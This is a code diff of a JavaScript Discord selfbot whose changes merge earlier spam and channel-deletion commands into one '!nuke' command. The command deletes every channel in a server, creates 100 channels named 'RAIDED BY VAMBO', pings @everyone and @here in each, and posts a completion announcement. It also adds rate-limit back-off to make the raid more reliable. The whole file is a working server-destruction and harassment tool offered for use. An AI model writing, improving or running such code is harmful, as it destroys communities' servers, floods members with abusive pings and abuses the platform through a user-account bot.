@@ -5,13 +5,13 @@ const client = new Client();
 const TOKEN = process.env.DISCORD_TOKEN;
 const PREFIX = '!';
 
-// Add web server for Railway
+// Web server for Railway
 const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-    res.send('Raid selfbot is running!');
+    res.send('Nuke selfbot is running!');
 });
 
 app.listen(PORT, () => {
@@ -21,7 +21,7 @@ app.listen(PORT, () => {
 client.on('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
     console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
-    console.log(`Type !raid, !spam, or !nuke in any channel`);
+    console.log(`Type !nuke in any channel to destroy the server`);
 });
 
 client.on('messageCreate', async (message) => {
@@ -32,171 +32,116 @@ client.on('messageCreate', async (message) => {
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // ===== CHANNEL SPAM COMMAND =====
-    if (command === 'spamchannels') {
+    // ===== FULL NUKE COMMAND =====
+    if (command === 'nuke') {
         const guild = message.guild;
         if (!guild) {
             message.reply('This command only works in servers!');
             return;
         }
 
-        // Get number of channels to create (default 10)
-        let channelCount = parseInt(args[0]) || 10;
-        if (channelCount > 50) channelCount = 50; // Safety limit
-        
-        message.reply(`🔥 Creating **${channelCount}** channels with pings...`);
-        
-        // Channel name with Zalgo text
-        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
-        
-        // Message with @everyone and @here pings
-        const raidMessage = `@everyone @here **RAIDED BY VAMBO**
+        // Confirm message
+        message.reply('💣 **NUKE INITIATED** - Deleting ALL channels...');
+        console.log(`Starting nuke on ${guild.name}`);
 
-### NEVER SCAM AGAIN SON😂
-            😯KICK ROCKS😯
-https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
-
-        let created = 0;
-        let failed = 0;
-
-        for (let i = 0; i < channelCount; i++) {
-            try {
-                // Create channel with number suffix to avoid duplicates
-                const channelSuffix = i > 0 ? `-${i}` : '';
-                const newChannel = await guild.channels.create(channelName + channelSuffix, {
-                    type: 'text'
-                });
-                
-                // Send ping message in the new channel
-                await newChannel.send(raidMessage);
-                
-                created++;
-                console.log(`✅ Created channel #${i+1}`);
-                
-                // Small delay to avoid rate limiting
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-            } catch (error) {
-                failed++;
-                console.error(`❌ Failed on channel ${i+1}:`, error.message);
-            }
-        }
+        // ===== STEP 1: DELETE ALL CHANNELS =====
+        let deletedCount = 0;
+        let deleteFailed = 0;
         
-        message.reply(`✅ **Raid complete!** Created ${created} channels, Failed: ${failed}`);
-    }
-
-    // ===== MESSAGE SPAM IN EXISTING CHANNELS =====
-    if (command === 'spam') {
-        const guild = message.guild;
-        if (!guild) return;
+        // Get all channels (text, voice, categories, etc.)
+        const channels = [...guild.channels.cache.values()];
         
-        let messageCount = parseInt(args[0]) || 20;
-        if (messageCount > 100) messageCount = 100; // Safety limit
-        
-        message.reply(`🔥 Spamming **${messageCount}** messages in this channel...`);
-        
-        const spamMessage = `@everyone @here **RAIDED BY VAMBO**
-
-### NEVER SCAM AGAIN SON😂
-            😯KICK ROCKS😯
-https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
-
-        for (let i = 0; i < messageCount; i++) {
-            try {
-                await message.channel.send(spamMessage);
-                console.log(`✅ Sent message ${i+1}`);
-                
-                // Small delay to avoid rate limiting
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-            } catch (error) {
-                console.error(`❌ Failed on message ${i+1}:`, error.message);
-                break;
-            }
-        }
-        
-        message.reply(`✅ Spammed ${messageCount} messages!`);
-    }
-
-    // ===== DELETE ALL CHANNELS (NUKE) =====
-    if (command === 'deletechannels') {
-        const guild = message.guild;
-        if (!guild) return;
-        
-        message.reply('🔥 **NUKING** all channels...');
-        
-        let deleted = 0;
-        let failed = 0;
-        
-        for (const channel of guild.channels.cache.values()) {
+        for (const channel of channels) {
             try {
                 await channel.delete();
-                deleted++;
-                console.log(`✅ Deleted ${channel.name}`);
-                await new Promise(resolve => setTimeout(resolve, 500));
+                deletedCount++;
+                console.log(`✅ Deleted: ${channel.name} (${channel.type})`);
+                
+                // Small delay to avoid rate limiting
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
             } catch (error) {
-                failed++;
+                deleteFailed++;
                 console.error(`❌ Failed to delete ${channel.name}:`, error.message);
             }
         }
         
-        // Create a new channel to announce completion
-        try {
-            const announceChannel = await guild.channels.create('GET-REKT', { type: 'text' });
-            await announceChannel.send(`@everyone **NUKE COMPLETE!**\nDeleted ${deleted} channels, Failed: ${failed}\n\n**RAIDED BY VAMBO**`);
-        } catch (error) {
-            console.error('Could not create announce channel');
-        }
-        
-        message.reply(`✅ Nuke complete! Deleted ${deleted} channels, Failed: ${failed}`);
-    }
+        console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels, Failed: ${deleteFailed}`);
 
-    // ===== FULL NUKE (DELETE + CREATE SPAM) =====
-    if (command === 'nuke') {
-        const guild = message.guild;
-        if (!guild) return;
+        // ===== STEP 2: CREATE 100 RAID CHANNELS =====
+        message.reply(`🔥 Deleted ${deletedCount} channels. Now creating **100 RAID CHANNELS**...`);
         
-        message.reply('💣 **FULL NUKE INITIATED** - Deleting all channels...');
-        
-        // Step 1: Delete all channels
-        let deleted = 0;
-        for (const channel of guild.channels.cache.values()) {
-            try {
-                await channel.delete();
-                deleted++;
-                console.log(`✅ Deleted ${channel.name}`);
-                await new Promise(resolve => setTimeout(resolve, 500));
-            } catch (error) {
-                console.error(`❌ Failed to delete:`, error.message);
-            }
-        }
-        
-        // Step 2: Create spam channels (50 of them)
-        message.reply(`🔥 Deleted ${deleted} channels. Creating 50 raid channels...`);
-        
+        // Channel name with Zalgo text
         const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
+        
+        // Raid message with @everyone and @here pings
         const raidMessage = `@everyone @here **RAIDED BY VAMBO**
 
 ### NEVER SCAM AGAIN SON😂
             😯KICK ROCKS😯
 https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;
 
-        let created = 0;
-        for (let i = 0; i < 50; i++) {
+        let createdCount = 0;
+        let createFailed = 0;
+
+        // Create 100 channels
+        for (let i = 1; i <= 100; i++) {
             try {
+                // Create channel with number (e.g., "R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉-1")
                 const newChannel = await guild.channels.create(`${channelName}-${i}`, {
-                    type: 'text'
+                    type: 'text' // 0 = text channel
                 });
+                
+                // Send raid message with pings
                 await newChannel.send(raidMessage);
-                created++;
-                console.log(`✅ Created channel ${i+1}`);
-                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                createdCount++;
+                console.log(`✅ Created channel ${i}/100: ${newChannel.name}`);
+                
+                // Delay to avoid rate limiting (Discord allows ~1 channel per second)
+                await new Promise(resolve => setTimeout(resolve, 1200));
+                
             } catch (error) {
-                console.error(`❌ Failed to create channel ${i+1}:`, error.message);
+                createFailed++;
+                console.error(`❌ Failed to create channel ${i}:`, error.message);
+                
+                // If rate limited, wait longer
+                if (error.message.includes('rate')) {
+                    console.log('⏳ Rate limited, waiting 5 seconds...');
+                    await new Promise(resolve => setTimeout(resolve, 5000));
+                }
             }
         }
-        
-        message.reply(`💀 **NUKE COMPLETE!** Deleted ${deleted} channels, Created ${created} spam channels with @everyone pings.`);
+
+        // ===== STEP 3: FINAL ANNOUNCEMENT =====
+        try {
+            // Try to create one final announcement channel
+            const finalChannel = await guild.channels.create('NUKE-COMPLETE', {
+                type: 'text'
+            });
+            
+            await finalChannel.send(`@everyone **NUKE COMPLETE!**
+
+🔥 **RESULTS:**
+✅ Deleted: ${deletedCount} channels
+✅ Created: ${createdCount} raid channels
+❌ Failed deletions: ${deleteFailed}
+❌ Failed creations: ${createFailed}
+
+**RAIDED BY VAMBO** 💀`);
+            
+        } catch (error) {
+            console.log('Could not create final announcement channel');
+        }
+
+        // Log final results
+        console.log('='.repeat(50));
+        console.log('💀 **NUKE COMPLETE** 💀');
+        console.log(`✅ Deleted: ${deletedCount} channels`);
+        console.log(`✅ Created: ${createdCount} raid channels`);
+        console.log(`❌ Delete failures: ${deleteFailed}`);
+        console.log(`❌ Create failures: ${createFailed}`);
+        console.log('='.repeat(50));
     }
 });
 
